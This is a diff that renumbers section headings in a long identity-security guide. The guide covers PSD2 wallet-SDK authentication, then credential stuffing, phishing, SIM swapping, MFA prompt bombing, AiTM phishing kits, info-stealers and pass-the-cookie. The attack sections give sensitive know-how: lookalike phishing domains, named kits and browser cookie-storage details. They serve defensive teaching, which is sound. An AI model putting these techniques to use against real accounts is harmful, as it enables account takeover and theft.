 During enrollment, the SDK generates a device-specific **asymmetric key pair** in the platform's hardware-backed storage:
 
@@ -23732,7 +23734,7 @@ The choice of signature algorithm affects key size, security level, signature si
 
 ECDSA P-256 is the dominant choice across all vendors, offering 128-bit security with compact 64-byte signatures and native hardware acceleration on both iOS (Secure Enclave) and Android (StrongBox/TEE). Ed25519 is gaining traction in newer SDK releases due to its simpler implementation and faster verification. Post-quantum algorithms (CRYSTALS-Dilithium) are not yet production-ready for mobile SDKs but should be on the vendor evaluation radar for long-term deployments.
 
-##### 20.2.2 Layer 2: PIN Activation (Knowledge Factor)
+##### 21.2.2 Layer 2: PIN Activation (Knowledge Factor)
 
 The user sets a numeric PIN during enrollment. The SDK uses this PIN to derive a **key encryption key (KEK)** via PBKDF2-HMAC-SHA-256 (§15.4.1) with a device-specific salt and a minimum of 210,000 iterations (NIST SP 800-63B Rev 4 guidance):
 
@@ -23759,7 +23761,7 @@ The KEK does **not** directly protect the hardware-backed signing key (which is 
 
 This two-key architecture — hardware-bound signing key + PIN-derived activation token — ensures that neither the PIN alone nor physical device possession alone is sufficient to sign. Both are required simultaneously, satisfying the PSD2 SCA two-factor requirement.
 
-##### 20.2.3 Layer 3: Biometric Activation (Inherence Factor)
+##### 21.2.3 Layer 3: Biometric Activation (Inherence Factor)
 
 Optionally (and commonly in modern deployments), the SDK binds the signing key to biometric authentication instead of or in addition to PIN:
 
@@ -23786,7 +23788,7 @@ $$H_{bio} = -\log_2(\text{FAR})$$
 
 For a banking-grade fingerprint sensor with FAR $= 10^{-5}$: $H_{bio} \approx 16.6$ bits. This is lower than the ~20-bit entropy of a 6-digit PIN or the 128-bit security of ECDSA P-256. However, biometrics are not primarily valued for entropy — they provide the regulatory **inherence factor** and dramatically improve user experience by eliminating PIN entry friction for routine authentication (ISO/IEC 30107-3).
 
-##### 20.2.4 Layer 4: Device Attestation and Runtime Protection
+##### 21.2.4 Layer 4: Device Attestation and Runtime Protection
 
 Beyond the three authentication factors, wallet SDKs implement continuous device integrity verification:
 
@@ -23881,7 +23883,7 @@ These defences operate **continuously** — not just at login, but throughout th
 3. **Accessibility service enumeration** — listing all active accessibility services via `AccessibilityManager.getEnabledAccessibilityServiceList()` and flagging non-standard services
 4. **Touch event validation** — comparing `MotionEvent.getRawX()` / `getRawY()` coordinates against the application's window bounds to detect touches originating from overlay windows
 
-##### 20.2.5 Entropy Budget Analysis
+##### 21.2.5 Entropy Budget Analysis
 
 The effective security of the multi-layer protection model can be quantified by analysing the **entropy budget** — the uncertainty each layer contributes for an attacker. The composite entropy determines the brute-force resistance of the overall system (NIST SP 800-63B).
 
@@ -23905,7 +23907,7 @@ $$P_{success} \approx 10^{-6} \times 5 \times 10^{-6} \times 10^{-2} = 5 \times 
 
 This per-authentication probability translates to an expected time between successful compromises of approximately 634 years at one authentication attempt per second across the entire population — well within acceptable banking security thresholds.
 
-##### 20.2.6 PSD2 RTS-to-SDK Mapping
+##### 21.2.6 PSD2 RTS-to-SDK Mapping
 
 Wallet SDKs must satisfy multiple articles of the PSD2 RTS (Commission Delegated Regulation 2018/389) to be considered SCA-compliant. The following table maps each RTS article to the corresponding SDK capability:
 
@@ -23920,7 +23922,7 @@ Wallet SDKs must satisfy multiple articles of the PSD2 RTS (Commission Delegated
 | Article 12 — Per-transaction SCA | Each transaction individually authenticated | SDK requires explicit user confirmation (PIN/bio) per transaction signing ceremony |
 | Article 13 — Exemption conditions | Risk-based analysis for low-value transactions | SDK sends device attestation + RASP signals to backend risk engine for scoring |
 
-##### 20.2.7 PSD2 SCA Exemption Categories
+##### 21.2.7 PSD2 SCA Exemption Categories
 
 PSD2 Article 18 and the RTS (Articles 10–18) define exemptions from SCA. These are **exemptions**, not waivers — the PSP may apply them but is not required to, and the customer's bank (ASPSP) must assess risk before accepting an exemption:
 
@@ -23938,7 +23940,7 @@ $$P(\text{fraud} | \text{transaction context}) = f(\text{amount}, \text{location
 
 If $P(\text{fraud}) &lt; \tau$ (the PSP's fraud threshold), the low-risk exemption applies. The PSP must adjust $\tau$ dynamically based on actual fraud rates: if the observed fraud rate exceeds the reference rate defined in the RTS, the PSP must **lower** $\tau$ (making the exemption harder to apply); if the observed fraud rate is below the reference rate, the PSP **may** raise $\tau$ (but is not required to). Wallet SDKs contribute to TRA by providing real-time device attestation and RASP integrity signals that feed into the PSP's fraud scoring engine.
 
-##### 20.2.8 PSD3 and the Evolving Regulatory Landscape
+##### 21.2.8 PSD3 and the Evolving Regulatory Landscape
 
 The Payment Services Package (PSD3 + PSR — Payment Services Regulation) adopted in April 2024 introduces changes relevant to wallet SDK-based SCA:
 
@@ -23955,7 +23957,7 @@ Key implications for wallet SDK deployments: **device binding** becomes a de fac
 #### 21.3 Credential Lifecycle and Operational Procedures
 Wallet SDK credentials progress through a defined lifecycle — from initial device enrollment through active use, rotation, multi-device synchronisation, and eventual decommissioning. The following sections detail each phase of this lifecycle, covering the ceremonies, state transitions, failure modes, and regulatory audit requirements that production deployments must address.
 
-##### 20.3.1 Enrollment Ceremony
+##### 21.3.1 Enrollment Ceremony
 
 The enrollment flow establishes the cryptographic binding between a user account and a specific physical device. The following sequence diagram illustrates the standard enrollment ceremony:
 
@@ -24196,7 +24198,7 @@ After this step, the enrollment is complete. Subsequent authentications require 
 
 </details>
 
-##### 20.3.2 Credential State Machine
+##### 21.3.2 Credential State Machine
 
 The credential lifecycle follows a deterministic state machine with server-authoritative state transitions:
 
@@ -24247,7 +24249,7 @@ stateDiagram-v2
 | ANY | Attestation failure | RASP or device attestation returns fail | Block authentication, escalate to fraud engine | (no state change, auth blocked) |
 | REVOKED | Re-enrollment | User re-authenticated via eKYC, new device attestation | Generate new key pair, full enrollment ceremony | PROVISIONED |
 
-##### 20.3.3 Race Condition Analysis
+##### 21.3.3 Race Condition Analysis
 
 Concurrent state transitions can lead to race conditions that undermine security or usability. Key scenarios and their mitigations:
 
@@ -24263,7 +24265,7 @@ Concurrent state transitions can lead to race conditions that undermine security
 
 → **Mitigation:** During the key rotation window (typically 30 minutes), both old and new keys are accepted by the CMS. The old key is marked as "rotating" (not "revoked") and can still sign transactions. After the rotation window expires, the old key is automatically revoked.
 
-##### 20.3.4 Multi-Device Handling
+##### 21.3.4 Multi-Device Handling
 
 Users commonly have the banking app installed on multiple devices (phone + tablet, personal phone + work phone). Wallet SDKs handle this by maintaining **independent credentials per device** in the bank's CMS:
 
@@ -24272,7 +24274,7 @@ Users commonly have the banking app installed on multiple devices (phone + table
 - Revoking one device's credential does not affect other devices — the bank can selectively revoke a compromised device while leaving the user's other devices operational
 - Some banks impose a maximum device limit (e.g., 3 active devices per user) as a risk control — enrolling device₄ requires revoking one of the existing three
 
-##### 20.3.5 Key Rotation
+##### 21.3.5 Key Rotation
 
 Periodic key rotation replaces the device's signing key pair with a fresh key pair. The rotation ceremony uses the **old key to authorise the new key**, creating a cryptographic chain of custody:
 
@@ -24503,7 +24505,7 @@ Upon receiving the CMS confirmation, the Wallet SDK instructs the Secure Enclave
 
 
 
-##### 20.3.6 Disaster Recovery
+##### 21.3.6 Disaster Recovery
 
 If a user loses their device, the credential stored in the Secure Enclave / StrongBox is permanently lost — there is no mechanism to extract or transfer the private key. Recovery strategies include:
 
@@ -24512,7 +24514,7 @@ If a user loses their device, the credential stored in the Secure Enclave / Stro
 3. **Multi-device independence:** Each device receives an independent credential — losing one device does not affect credentials on other devices. The user can continue banking on remaining devices while enrolling a replacement
 4. **Temporary session extension:** When device loss is reported, the CMS can extend the session lifetime on remaining devices, giving the user time to complete re-enrollment without service interruption
 
-##### 20.3.7 Regulatory Audit Trail
+##### 21.3.7 Regulatory Audit Trail
 
 PSD2 requires payment service providers to maintain comprehensive audit trails of authentication events. Wallet SDKs generate structured event logs for each significant lifecycle event:
 
@@ -24528,7 +24530,7 @@ PSD2 requires payment service providers to maintain comprehensive audit trails o
 | Device attestation check | Device ID, attestation result (pass/fail), risk signals, timestamp | 2 years |
 
 #### 21.4 SDK Integration Patterns for Mobile Platforms
-##### 20.4.1 iOS Integration
+##### 21.4.1 iOS Integration
 
 | Aspect | Details |
 |:-------|:--------|
@@ -24581,7 +24583,7 @@ if device.isSupported \{
 \}
 ```
 
-##### 20.4.2 Android Integration
+##### 21.4.2 Android Integration
 
 | Aspect | Details |
 |:-------|:--------|
@@ -24638,7 +24640,7 @@ integrityManager.requestIntegrityToken(request)
 \}
 ```
 
-##### 20.4.3 Cross-Platform Considerations
+##### 21.4.3 Cross-Platform Considerations
 
 Banks deploying wallet SDKs face a **feature parity challenge** across platforms. The following table illustrates hardware security support across popular device brands:
 
@@ -24657,7 +24659,7 @@ The SDK must query `BiometricManager.canAuthenticate(BIOMETRIC_STRONG)` and hand
 
 **The Huawei no-GMS challenge.** Since May 2019, Huawei devices cannot include Google Play Services, making Play Integrity unavailable. Banks must either: accept an alternative attestation mechanism (Huawei's proprietary attestation service), require additional out-of-band verification for Huawei users, or exclude Huawei devices from wallet SDK authentication (regulatory risk if the exclusion discriminates).
 
-##### 20.4.4 Transaction Data Formatting
+##### 21.4.4 Transaction Data Formatting
 
 Different payment schemes and banking backends use different data formats for transaction descriptors. Wallet SDKs must support multiple formats:
 
@@ -24670,7 +24672,7 @@ Different payment schemes and banking backends use different data formats for tr
 
 JSON canonicalisation (RFC 8785) is the most common approach for modern banking APIs. XML canonicalisation (W3C C14N 1.1 Exclusive) is required for ISO 20022-based payment systems. The SDK must implement the canonicalisation rules correctly — any deviation produces a different hash, causing dynamic linking verification to fail.
 
-##### 20.4.5 Transaction Confirmation UX Patterns
+##### 21.4.5 Transaction Confirmation UX Patterns
 
 The way transaction details are presented during the confirmation step is critical for both security (ensuring the user actually reads the details) and usability (minimising friction). Four patterns are prevalent in production deployments:
 
@@ -24689,7 +24691,7 @@ The way transaction details are presented during the confirmation step is critic
 | Number matching | High | Medium | Very High | Required by BaFin, DNB |
 | Cronto visual cryptogram | Very High | Medium | Very High | Accepted, not required |
 
-##### 20.4.6 Migration Strategies
+##### 21.4.6 Migration Strategies
 
 **Migrating from SMS OTP.** The migration from SMS OTP to wallet SDK-based authentication is the most common modernisation path for European banks, driven by the EBA's deprecation of SMS OTP due to SIM swap attacks, real-time phishing, and SS7 protocol exploitation (EBA Report 2019):
 
@@ -24725,7 +24727,7 @@ The way transaction details are presented during the confirmation step is critic
 | Analytics fragmentation | Unified logging pipeline normalising events from both systems |
 | Rollback readiness | Ability to revert to old method within 4 hours if critical issues arise |
 
-##### 20.4.7 Enterprise Deployment: SDK Version Management
+##### 21.4.7 Enterprise Deployment: SDK Version Management
 
 Banking applications operate on slower release cycles than consumer apps (quarterly or semi-annual updates). SDK version management must account for:
 
@@ -24741,7 +24743,7 @@ Banking applications operate on slower release cycles than consumer apps (quarte
 
 **Deprecation policy:** Vendors typically provide 12–18 months notice before deprecating an SDK version. During the deprecation period the SDK continues to function but may stop receiving security patches. After the deprecation date, the SDK may be hard-disabled on the CMS side.
 
-##### 20.4.8 Financial Services Form Factor Recommendations
+##### 21.4.8 Financial Services Form Factor Recommendations
 
 The financial services sector faces a distinctive threat model — financially motivated attackers, account takeover, SIM swap, and social engineering — combined with stringent regulatory requirements (PCI DSS, SOX, GLBA). Wallet SDK deployment strategies differ significantly between employee and customer populations:
 
@@ -24769,7 +24771,7 @@ The following table compares the three dominant mobile authentication approaches
 | **User experience friction** | Medium — app switch for confirmation required | Low — biometric prompt, seamless one-tap | Medium — copy code from authenticator app, 30s window |
 | **Vendor lock-in** | High — SDK-specific CMS, credential format, re-enrollment required for migration | Medium — platform ecosystem, exportable credentials | Low — standard algorithm (RFC 6238), portable across apps |
 
-##### 20.5.1 Analysis of Key Differences
+##### 21.5.1 Analysis of Key Differences
 
 **Phishing resistance:** Passkeys offer the strongest phishing resistance due to WebAuthn's origin-binding mechanism — the authentication response is cryptographically bound to the relying party's domain. Wallet SDKs also resist phishing because authentication happens through a dedicated mobile app channel (push notification or app launch), not through the web browser. TOTP offers no phishing resistance because the user manually copies a time-based code, which can be entered on any site.
 
@@ -24781,7 +24783,7 @@ The following table compares the three dominant mobile authentication approaches
 
 **Vendor lock-in:** Wallet SDKs have the highest lock-in because credentials are stored in a vendor-specific format on a vendor-specific CMS. Migrating between vendors requires full re-enrollment. TOTP has the lowest lock-in because the shared secret can be exported and imported into any RFC 6238-compliant authenticator.
 
-##### 20.5.2 Hybrid Approaches
+##### 21.5.2 Hybrid Approaches
 
 Some banks adopt hybrid approaches to leverage multiple mechanisms:
 
@@ -24821,7 +24823,7 @@ The attack landscape is shaped by a fundamental asymmetry: defenders must protec
 | Consent phishing (§22.2.5) | Application Access Token | T1550.001 |
 
 #### 22.1 Credential Stuffing and Password Spraying
-##### 21.1.1 Credential Stuffing
+##### 22.1.1 Credential Stuffing
 
 Credential stuffing is the automated, large-scale submission of username/password pairs — harvested from previous data breaches — against target login endpoints. The attack exploits **password reuse**: users who employ the same password across multiple services are vulnerable the moment any one of those services is breached.
 
@@ -25065,7 +25067,7 @@ The attacker utilizes the hijacked sessions to drain financial assets, exfiltrat
 
 </details>
 
-##### 21.1.2 Password Spraying
+##### 22.1.2 Password Spraying
 
 Password spraying is the inverse of credential stuffing: instead of trying many passwords against one account, the attacker tries a **small number of commonly used passwords** against a large number of accounts. The key tactical advantage is evasion of per-account lockout thresholds.
 
@@ -25119,7 +25121,7 @@ Each account sees only one failed attempt per round — well below the typical l
 - Predictable password policies (minimum 8 characters, one uppercase, one number, one special character → users converge on patterns like `Season+Year+!`)
 - Legacy protocols that bypass MFA (IMAP, SMTP AUTH, POP3 — legacy mail protocols that accept username/password without MFA challenge)
 
-##### 21.1.3 Defenses Against Credential Attacks
+##### 22.1.3 Defenses Against Credential Attacks
 
 | Defense | Mechanism | Effectiveness |
 |:--------|:----------|:-------------|
@@ -25149,7 +25151,7 @@ Phishing is the delivery of deceptive communications — typically email, but al
 
 Phishing attacks form a spectrum from mass-market campaigns (thousands of generic emails) to highly targeted operations (a single, meticulously crafted email to a specific individual). The following subsections document each variant.
 
-##### 21.2.1 Clone Phishing
+##### 22.2.1 Clone Phishing
 
 The attacker creates a replica of a legitimate email — identical branding, formatting, and content — with links pointing to attacker-controlled domains. The cloned email may replicate a real email the victim previously received (e.g., a password reset notification, a shared document alert), increasing credibility. The phishing domain is typically a typosquatted variant of the legitimate domain (`micr0soft-login.com`, `acme-secure.net`) or a homograph attack using visually similar Unicode characters (`microsоft.com` where the `о` is a Cyrillic character).
 
@@ -25185,19 +25187,19 @@ Modern browsers have implemented IDN homograph protection policies, but these pr
 
 </details>
 
-##### 21.2.2 Spear Phishing
+##### 22.2.2 Spear Phishing
 
 Targeted phishing directed at specific individuals using personal context harvested from LinkedIn profiles, social media, corporate directory listings, or previous correspondence. Spear phishing emails reference the victim by name, mention specific projects, colleagues, or business relationships, and are crafted to bypass the victim's suspicion threshold. Used extensively by APT groups for initial access to high-value targets (executives, system administrators, security engineers).
 
-##### 21.2.3 Vishing (Voice Phishing)
+##### 22.2.3 Vishing (Voice Phishing)
 
 Phone calls impersonating IT helpdesk staff, bank representatives, or security teams, requesting credentials, MFA codes, or actions such as approving push notifications. Vishing was the social engineering component in both the **Uber (September 2022)** and **Cisco (May 2022)** breaches — the attacker called the victim via WhatsApp, impersonated IT support, and convinced the victim to approve an MFA push notification.
 
-##### 21.2.4 Smishing (SMS Phishing)
+##### 22.2.4 Smishing (SMS Phishing)
 
 SMS messages containing malicious links or urgent calls to action ("Your account has been locked. Verify your identity: [link]"). Smishing exploits the trust users place in SMS as a communication channel and the limited URL preview capability of mobile SMS clients — users cannot easily inspect the destination URL before tapping.
 
-##### 21.2.5 Consent Phishing (OAuth)
+##### 22.2.5 Consent Phishing (OAuth)
 
 The attacker creates a malicious OAuth application and tricks the user into granting it access permissions via the **legitimate OAuth consent flow**. The user never enters a password — instead, they click "Allow" on a genuine consent screen from the identity provider (Microsoft Entra ID, Google), unknowingly granting the attacker's application access to read email, access files, or send messages on their behalf. The attacker obtains an access token via delegated authorisation — not the user's password.
 
@@ -25213,7 +25215,7 @@ The attacker creates a malicious OAuth application and tricks the user into gran
 | **App governance (Defender for Cloud Apps)** | Monitor application behavior post-consent — detect anomalous API calls, data exfiltration patterns, and excessive permission usage |
 | **Conditional Access for workload identities** | Apply Conditional Access policies to service principals — block applications from risky locations or require MFA for administrative operations |
 
-##### 21.2.6 Authentication Method Vulnerability to Phishing
+##### 22.2.6 Authentication Method Vulnerability to Phishing
 
 | Method | Phishing Resistance | Rationale |
 |:-------|:--------------------|:----------|
@@ -25236,12 +25238,12 @@ Email authentication protocols (SPF, DKIM, DMARC) provide infrastructure-level d
 
 The critical weakness of email authentication is that it only prevents domain spoofing — it does not prevent phishing from compromised legitimate accounts (which have valid SPF/DKIM signatures) or from lookalike domains (which have their own valid signatures).
 
-##### 21.2.7 Angler Phishing (Social Media)
+##### 22.2.7 Angler Phishing (Social Media)
 
 Angler phishing occurs on social media platforms, where attackers impersonate customer support accounts and initiate contact with victims via direct messages (DMs). The victim typically reaches out to what they believe is the official support account of a service (e.g., a bank, a cryptocurrency exchange, or a SaaS provider) after encountering an issue. The attacker — operating a lookalike account with the platform's verified badge or a convincing username — responds with instructions that lead the victim to a credential harvesting page. This variant is particularly dangerous because social media DMs bypass email security controls entirely, victims initiate the conversation (reducing suspicion), URLs shared in messages are not scanned by email gateways, and platform-branded shortened URLs (e.g., `t.co`) provide a veneer of legitimacy.
 
 #### 22.3 SIM Swapping and SS7/Diameter Exploitation
-##### 21.3.1 SIM Swap Attack
+##### 22.3.1 SIM Swap Attack
 
 A SIM swap attack transfers the victim's phone number from their legitimate SIM card to a SIM card controlled by the attacker. All SMS messages — including OTP codes — are subsequently delivered to the attacker's device.
 
@@ -25258,7 +25260,7 @@ A SIM swap attack transfers the victim's phone number from their legitimate SIM 
 - **Twitter CEO Jack Dorsey (August 2019)** — attackers performed a SIM swap on Dorsey's AT&T account, gained access to his Twitter account via SMS-based 2FA, and posted offensive content
 - **Cryptocurrency account takeovers** — SIM swapping is the dominant attack vector for cryptocurrency theft from exchange accounts protected by SMS 2FA. A single SIM swap can lead to millions of dollars in cryptocurrency being transferred to attacker wallets within minutes
 
-##### 21.3.2 SS7 Exploitation
+##### 22.3.2 SS7 Exploitation
 
 SS7 (Signaling System No. 7) is the legacy telecom signaling protocol — developed in the 1970s and 1980s — that controls call setup, SMS routing, number translation, and roaming across the global telephone network. SS7 was designed for a closed network of trusted carriers and **has no authentication or encryption**. Any entity with access to the SS7 network can:
 
@@ -25268,13 +25270,13 @@ SS7 (Signaling System No. 7) is the legacy telecom signaling protocol — develo
 
 SS7 access is commercially available in gray-market services for as little as $500–1,000. Security researchers have repeatedly demonstrated SMS interception via SS7 in controlled tests, and nation-state actors routinely exploit SS7 for surveillance.
 
-##### 21.3.3 Diameter (4G/5G)
+##### 22.3.3 Diameter (4G/5G)
 
 Diameter is the successor signaling protocol for 4G LTE and 5G networks, replacing SS7 for core network functions. Diameter provides improved security over SS7 — including support for TLS/DTLS transport — but still has vulnerabilities. Researchers have demonstrated subscriber tracking and message interception via Diameter, particularly during roaming scenarios where inter-carrier trust boundaries are weak.
 
 Even in modern 5G deployments, SS7 interworking is maintained for backward compatibility (voice calls to 2G/3G networks, roaming with legacy carriers), preserving the SS7 attack surface.
 
-##### 21.3.4 Impact on Authentication
+##### 22.3.4 Impact on Authentication
 
 SMS OTP (§10.2) is **defeated entirely** by SIM swapping and SS7 interception. NIST SP 800-63B classifies SMS OTP as a **"restricted" authenticator** — organisations that use it must:
 
@@ -25291,7 +25293,7 @@ SMS OTP (§10.2) is **defeated entirely** by SIM swapping and SS7 interception. 
 - Pre-swap notification alerts — some carriers send SMS alerts to the current SIM before processing a swap, giving the legitimate owner a window to contact the carrier and cancel the request
 - STIR/SHAKEN (Secure Telephone Identity Revisited / Signature-based Handling of Asserted information using toKENs) — a US FCC-mandated framework for call authentication that helps verify the origin of phone calls, reducing the effectiveness of vishing attacks that complement SIM swap campaigns
 
-##### 21.3.5 OTP Token Emulation Attacks
+##### 22.3.5 OTP Token Emulation Attacks
 
 Token emulation occurs when an attacker clones a hardware or software OTP token's behaviour by extracting or reproducing the shared secret (RFC 4226 seed). Unlike OTP interception attacks (SIM swap, SS7) that target the delivery channel, token emulation targets the secret itself — the cloned token produces mathematically identical codes to the original.
 
@@ -25304,7 +25306,7 @@ Token emulation occurs when an attacker clones a hardware or software OTP token'
 
 **Detection limitation:** Token emulation is fundamentally undetectable by the OTP protocol itself — a cloned token produces mathematically identical codes to the original. Detection must rely on contextual signals: geographic impossibility (login from two locations within seconds), user-agent anomalies, or behavioural biometrics. This is why NIST SP 800-63B mandates additional controls (rate limiting, look-ahead windows, re-authentication policies) alongside OTP verification.
 
-##### 21.3.6 TOTP Threat Model: Comprehensive Attack Matrix
+##### 22.3.6 TOTP Threat Model: Comprehensive Attack Matrix
 
 The following matrix enumerates the principal attack vectors against TOTP-based authentication, calibrated for typical enterprise deployments in 2025–2026:
 
@@ -25323,7 +25325,7 @@ The following matrix enumerates the principal attack vectors against TOTP-based 
 
 **Key insight:** The dominant threat to TOTP-protected accounts in 2025–2026 is AiTM phishing (#2), not brute-force or code interception. AiTM kits are widely available as PhaaS offerings. TOTP provides zero structural defence against this attack. Organisations relying on TOTP as their sole MFA method should plan a migration path to phishing-resistant authentication (FIDO2/WebAuthn, device-bound passkeys) — particularly for privileged accounts and high-value targets.
 
-##### 21.3.7 OCRA Attack Surface
+##### 22.3.7 OCRA Attack Surface
 
 OCRA (RFC 6287) extends the OTP model to challenge-response and transaction-signing scenarios. Unlike TOTP (time-based, no server interaction during code generation), OCRA computes responses from a server-issued challenge, a shared secret, and optional parameters (counter, PIN, timestamp). This introduces a distinct threat model:
 
@@ -25342,7 +25344,7 @@ OCRA (RFC 6287) extends the OTP model to challenge-response and transaction-sign
 
 **Key distinction from TOTP:** OCRA's challenge-response design provides inherent protection against response transplantation — a relay attacker cannot transplant a response from one session to another because the challenge is unique and the HMAC response is cryptographically bound to it. However, real-time bidirectional relay (the standard AiTM proxy attack) remains effective against non-transaction OCRA flows.
 
-##### 21.3.8 Challenge Replay Attacks (OCRA/OTP)
+##### 22.3.8 Challenge Replay Attacks (OCRA/OTP)
 
 The most straightforward attack against OCRA is challenge replay — intercepting a valid $(Q, R)$ pair and replaying $R$ when the same $Q$ is presented. OCRA is deterministic: the same key, challenge, counter, PIN hash, and timestamp always produce the same response. An attacker who observes a valid challenge-response pair can replay the response if the server reuses the challenge.
 
@@ -25358,7 +25360,7 @@ The most straightforward attack against OCRA is challenge replay — interceptin
 The counter parameter $C$ provides **cryptographic** replay protection (the response differs even if the same challenge is reused), while the one-time challenge table provides **protocol-level** protection (the challenge is removed from circulation). Both should be used in production.
 
 #### 22.4 Push Notification Fatigue/MFA Prompt Bombing
-##### 21.4.1 Attack Mechanism
+##### 22.4.1 Attack Mechanism
 
 The attacker has obtained the victim's password (from phishing, credential stuffing, or a breach dump) and repeatedly triggers MFA push notifications to the victim's registered device. The goal is to overwhelm the victim into approving a notification out of fatigue, confusion, annoyance, or a desire to stop the notifications.
 
@@ -25542,7 +25544,7 @@ The Identity Provider receives the mathematically valid signed assertion origina
 
 
 
-##### 21.4.2 Real-World Cases
+##### 22.4.2 Real-World Cases
 
 **Uber (September 2022) — Lapsus$:** An attacker obtained the credentials of an external Uber contractor — likely purchased from the dark web after the contractor's personal device was infected with info-stealer malware. The attacker then bombarded the contractor with MFA push notifications and simultaneously contacted them via WhatsApp, impersonating Uber IT support, instructing them to approve the prompt. The contractor eventually approved. The attacker then escalated privileges by discovering admin credentials in PowerShell scripts on internal network shares, gaining access to Uber's G-Suite, Slack, source code repositories, and HackerOne bug reports. Attribution: Lapsus$ threat group.
 
@@ -25562,7 +25564,7 @@ The Identity Provider receives the mathematically valid signed assertion origina
 
 </details>
 
-##### 21.4.3 Mitigations
+##### 22.4.3 Mitigations
 
 **Number matching:** The push notification displays a two-digit number that the user must match with the number shown on the login screen. This transforms the push from a binary "Approve/Deny" decision into a verification task that requires the user to be actively looking at the legitimate login page. Blind approval is no longer possible — the user cannot approve without seeing the matching number.
 
@@ -25579,7 +25581,7 @@ The Identity Provider receives the mathematically valid signed assertion origina
 #### 22.5 Adversary-in-the-Middle (AiTM) Phishing Kits
 AiTM phishing is the single most dangerous attack against MFA-protected accounts in 2024–2025. Unlike traditional phishing — which captures static credentials on a fake page — AiTM operates a **real-time reverse proxy** between the victim and the legitimate service, transparently relaying all traffic while extracting session tokens.
 
-##### 21.5.1 Mechanism
+##### 22.5.1 Mechanism
 
 ```mermaid
 flowchart LR
@@ -25615,7 +25617,7 @@ flowchart LR
 - **WebAuthn/FIDO2** — the authenticator signs over the RP's origin (`login.target.com`). When the victim is on the phishing domain (`login-secure365.com`), the authenticator produces an assertion bound to the phishing origin, which the legitimate server rejects because the origin does not match
 - **mTLS / Certificate-Based Authentication** — the TLS client certificate is presented during the TLS handshake with the server. The proxy terminates TLS with the victim using its own certificate (for `login-secure365.com`) and establishes a separate TLS connection to the legitimate server. The client certificate is bound to the TLS session with the proxy, not with the legitimate server — the legitimate server does not receive the client certificate
 
-##### 21.5.1.1 Why WebAuthn Origin Binding Defeats AiTM
+##### 22.5.1.1 Why WebAuthn Origin Binding Defeats AiTM
 
 The WebAuthn protocol's resistance to AiTM is not a configurable feature — it is a structural property of the protocol's cryptographic design. Understanding why requires examining the assertion signature:
 
@@ -25804,7 +25806,7 @@ This argument assumes a conforming WebAuthn implementation with a FIDO2-certifie
 
 </details>
 
-##### 21.5.2 Commercial AiTM Phishing Kits
+##### 22.5.2 Commercial AiTM Phishing Kits
 
 The AiTM phishing ecosystem has been industrialised into a Phishing-as-a-Service (PhaaS) market. The following table compares the dominant AiTM platforms:
 
@@ -25825,7 +25827,7 @@ The AiTM phishing ecosystem has been industrialised into a Phishing-as-a-Service
 
 The PhaaS market in 2025 also includes numerous newer entrants — Sneaky 2FA, Whisper 2FA, GhostFrame, Gabagool, Saiga 2FA, Legions 2FA, BlackForce, InboxPrime AI — many incorporating AI-generated phishing content and advanced anti-analysis measures. An estimated **90% of high-volume phishing campaigns** in 2025 leverage PhaaS platforms, and the number of PhaaS platforms doubled during 2025.
 
-##### 21.5.3 AiTM Mitigation Comparison
+##### 22.5.3 AiTM Mitigation Comparison
 
 The following table provides a structured comparison of authentication methods against AiTM relay attacks. The critical distinction is between methods that are *cryptographically bound to the server's origin* (structurally immune) and those that rely on shared secrets or delivery channels that can be relayed:
 
@@ -25840,7 +25842,7 @@ The following table provides a structured comparison of authentication methods a
 
 **OCRA-specific MITM note:** OCRA's challenge-response design provides inherent protection against *response transplantation* between sessions — a relay attacker cannot transplant a response from one session to another because the HMAC response is cryptographically bound to the specific challenge. However, real-time bidirectional relay (the standard AiTM proxy pattern) remains effective against non-transaction OCRA flows. For transaction-signing scenarios, WYSIWYS (What You See Is What You Sign) trusted displays — where the authenticator independently shows the transaction details derived from the challenge — provide the strongest MITM defence, as the user can verify they are authorising the correct transaction.
 
-##### 21.5.4 Post-Authentication Token Theft
+##### 22.5.4 Post-Authentication Token Theft
 
 Even when the initial authentication uses a phishing-resistant method (e.g., the user authenticates with a WebAuthn passkey on the phishing domain — the assertion fails, but the attacker pivots to a different strategy), AiTM proxies can target the **post-authentication session**. If the legitimate server issues a session cookie after successful authentication, and the user was somehow authenticated (e.g., via a non-phishing-resistant fallback method), the proxy captures the session cookie.
 
@@ -25851,7 +25853,7 @@ Even when the initial authentication uses a phishing-resistant method (e.g., the
 - **Continuous Access Evaluation (CAE)** (§40) — real-time revocation of session tokens when risk signals change (IP address change, device compliance violation, impossible travel detection)
 - **Short-lived tokens with refresh token rotation** (§36.4) — limiting the window during which a stolen token is valid
 
-##### 21.5.5 SET Replay Attack Pattern (Continuous Access Evaluation)
+##### 22.5.5 SET Replay Attack Pattern (Continuous Access Evaluation)
 
 Continuous Access Evaluation (CAE) uses Security Event Tokens (SETs) — signed JWTs carrying session revocation and risk events — to enable real-time session lifecycle management. The integrity of this system depends on the receiver's ability to validate SETs and detect replayed tokens.
 
@@ -25865,7 +25867,7 @@ Where $R_{\text{events}}$ is the event arrival rate and $T_{\text{dedup}}$ is th
 
 **Additional countermeasures:** SET signature validation (steps 1–4 in the standard validation checklist), strict `exp` claim enforcement, and clock skew tolerance (typically 300 seconds) prevent malformed or expired replays from being processed.
 
-##### 21.5.6 WebAuthn Attack Surface Taxonomy
+##### 22.5.6 WebAuthn Attack Surface Taxonomy
 
 WebAuthn is the most phishing-resistant authentication method available, but no system is without attack surfaces. The following taxonomy catalogues known attack vectors against WebAuthn/FIDO2 implementations as of 2025, categorised by threat actor requirements and mitigation status:
 
@@ -25942,7 +25944,7 @@ The root cause was insufficient access control in the credential management comm
 </details>
 
 #### 22.6 Token Theft and Session Hijacking (Info-Stealer Malware)
-##### 21.6.1 Info-Stealer Malware Landscape
+##### 22.6.1 Info-Stealer Malware Landscape
 
 Info-stealer malware families — specialised trojans designed to extract browser cookies, session tokens, saved passwords, cryptocurrency wallets, and authentication credentials from compromised endpoints — represent the most significant post-authentication threat to identity security.
 
@@ -25977,7 +25979,7 @@ Info-stealer malware families — specialised trojans designed to extract browse
 
 </details>
 
-##### 21.6.2 Pass-the-Cookie Attack
+##### 22.6.2 Pass-the-Cookie Attack
 
 The attacker extracts the victim's session cookie from the compromised browser and imports it into their own browser session. The target server sees a valid, already-authenticated session — the attacker bypasses the entire authentication ceremony (username + password + MFA) because the cookie represents the *result* of a completed authentication, not an ongoing challenge.
 
@@ -26007,7 +26009,7 @@ The attacker extracts the victim's session cookie from the compromised browser a
 | **Safari** (macOS) | Binary cookies file | AES-128/CBC | Keychain | Medium |
